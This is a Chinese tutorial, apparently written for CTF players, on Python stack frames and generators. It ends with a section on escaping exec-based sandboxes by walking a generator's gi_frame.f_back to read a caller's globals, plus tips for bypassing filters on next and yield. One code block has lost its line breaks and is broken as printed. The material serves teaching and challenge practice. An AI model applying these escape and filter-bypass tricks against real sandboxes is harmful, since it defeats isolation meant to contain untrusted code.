在 Python 执行过程中，栈帧（stack frame）是一个关键概念。栈帧代表函数调用的执行环境，包含了函数执行所需的所有信息，包括局部变量、操作数栈、返回地址等。每次函数调用都会创建一个新的栈帧，并将其压入调用栈（call stack）。函数执行完毕后，栈帧会被弹出调用栈。
## 栈帧的组成
1. 局部变量表：存储函数内部定义的局部变量和参数。
2. 操作数栈：用于计算过程中临时存储操作数和中间结果。
3. 帧数据：包含函数的返回地址、调用者的栈帧引用、异常处理信息等。
4. 指令计数器：指示当前执行到的字节码指令的位置。
## 栈帧属性
- **f_locals**：一个字典，包含了函数或方法的局部变量，键是变量名，值是变量的值。
- **f_globals**：一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。
- **f_code**：一个代码对象，包含了函数或方法的字节码指令，常量，变量名等信息。
- **f_lasti**：整数，表示最后执行的字节码指令的索引。
- **f_back**：指向上一级调用栈的引用，用于构建调用栈。
## 示例
```python
def foo(a, b):
    c = a + b
    bar(c)

def bar(x):
    y = x * 2
    print(y)

foo(3, 4)
```
**调用`foo(3,4)`
- 创建foo()函数的栈帧，压入调用栈。
- `foo()`函数的局部变量表包含，`a=3` 和`b=4`。
**执行c = a+b
- 在`foo()`的操作数栈上计算a+b，将结果7存储在局部变量c中。
**调用bar(c)
- 创建`bar()`函数的栈帧，压入调用栈
- `bar()`函数的局部变量表包含`x=7`
**执行`y=x*2`
- 在bar()函数的操作数栈上计算`x*2`，将结果14储存在局部变量y中。
**执行print(y)
- 打印y的值14
**bar()函数结束
- 从调用栈中弹出 `bar` 的栈帧，释放其内存。
**foo()函数结束
- 从调用栈中弹出 `foo` 的栈帧，释放其内存。
## 生成器
生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。
在 Python 中，生成器可以通过两种方式创建：
一. 生成器函数，定义一个函数，使用 `yield` 关键字生成值，每次调用生成器函数时，生成器会暂停并返回一个值，下次调用时会从暂停的地方继续执行。
（符合上面的每次生成值后保留当前的状态，以便下次调用时可以继续生成值）。
例如
```python
def my_generator():  
    yield 1  
    yield 2  
    yield 3  
gen = my_generator()  
print(next(gen))  
print(next(gen))  
print(next(gen))
```
输出
```
1
2
3
```
二.生成器表达式，使用类似列表推导式的语法，但使用圆括号而不是方括号，可以用来创建生成器对象。生成器表达式会逐个生成值，而不是一次性生成整个序列，这样可以节省内存空间，特别是在处理大型数据集时非常有用（依然符合每次生成值后保留当前的状态，以便下次调用时可以继续生成值）。
示例
```python
gen = (x * x for x in range(10))  
print(list(gen))
# 输出[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]
```
## 生成器属性
- **gi_code**：生成器对应的code对象。
- **gi_frame**：生成器对应的frame（栈帧）对象。
- **gi_runing**：生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。
- **gi_yieldfrom**：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。
- **gi_frame**是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。
例如
```python
def my_generator():  
    yield 1  
    yield 2  
    yield 3  
gen = my_generator()  
#获取生成器的当前帧信息  
frame = gen.gi_frame  
#输出生成器的当前帧信息  
print("Local Variables:",frame.f_locals)  
print("Global Variables:", frame.f_globals)  
print("Code Object:", frame.f_code)  
print("Instruction Pointer:", frame.f_lasti)
```
同理利用`gi_code`属性也可以获得生成器的相关代码对象属性：
```python
def my_generator():  
    yield 1  
    yield 2  
    yield 3  
gen = my_generator()  
#获取生成器的当前代码信息  
code = gen.gi_code  
#输出生成器的当前代码信息  
print( code.co_name)  
print(code.co_code)  
print( code.co_consts)  
print(code.co_filename)
```
## 利用栈帧沙箱逃逸
原理就是通过生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表
例如
```python
s3cret = "flag{this_is_flag!}"  
  
def waff():  
    def f():  
        yield g.gi_frame.f_back  
    g = f() # 生成器  
    frame = next(g) # 获取到生成器的栈帧对象  
    b = frame.f_globals['s3cret']  
    print(b)  
b = waff()
```
或者
```python
s3cret = "flag{this_is_flag!}"  
  
def waff():  
    def f():  
        yield g.gi_frame.f_back  
    g = f() # 生成器  
    frame = next(g) # 获取到生成器的栈帧对象  
    b = frame.f_back.f_globals['s3cret']  #返回并获取前一级栈帧的globals
    print(b)  
b = waff()
```
可以打印出frame这个栈帧对象
```
<frame at 0x0000020F97255040, file 'D:\\yinwenmingtwo\\PythonCode\\测试\\1.py', line 9, code waff>
<frame at 0x00000176546465B0, file 'D:\\yinwenmingtwo\\PythonCode\\测试\\1.py', line 13, code <module>>
```
在看看上面的`f_globals`: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。
不难看出这里函数和模块本就同在一个全局，所以都有属性s3cret，怎么看到没到全局？直接看file就能看出。
例如
```python
s3cret="this is flag"  
  
codes='''  
def waff():  
    def f():        yield g.gi_frame.f_back  
    g = f()  #生成器  
    frame = next(g) #获取到生成器的栈帧对象  
    print(frame)    print(frame.f_back)    print(frame.f_back.f_back)    b = frame.f_back.f_back.f_globals['s3cret'] #返回并获取前一级栈帧的globals  
    return bb=waff()  
'''  
locals = {}  
code = compile(codes,"test","exec") # 将字符串代码编译成可执行的代码对象  
exec(code,locals) # 执行编译后的代码，指定locals作为全局/局部命名空间  
print(locals["b"]) # 输出secrect值。
```
运行结果
```
<frame at 0x000001768129D8C0, file 'test', line 8, code waff>
<frame at 0x00000176812C0FC0, file 'test', line 13, code <module>>
<frame at 0x0000017681229C40, file 'C:\\Users\\Lenovo\\Downloads\\server\\server.py', line 19, code <module>>
this is flag
```
## 绕过
`next`过滤可以用`list`和`send`和生成器表达式进行绕过。
`yield`过滤也可以用生成器表达式绕过。
## 例题








## 参考文章
https://blog.csdn.net/Jesse_Kyrie/article/details/139789665
https://www.cnblogs.com/gaorenyusi/p/18242719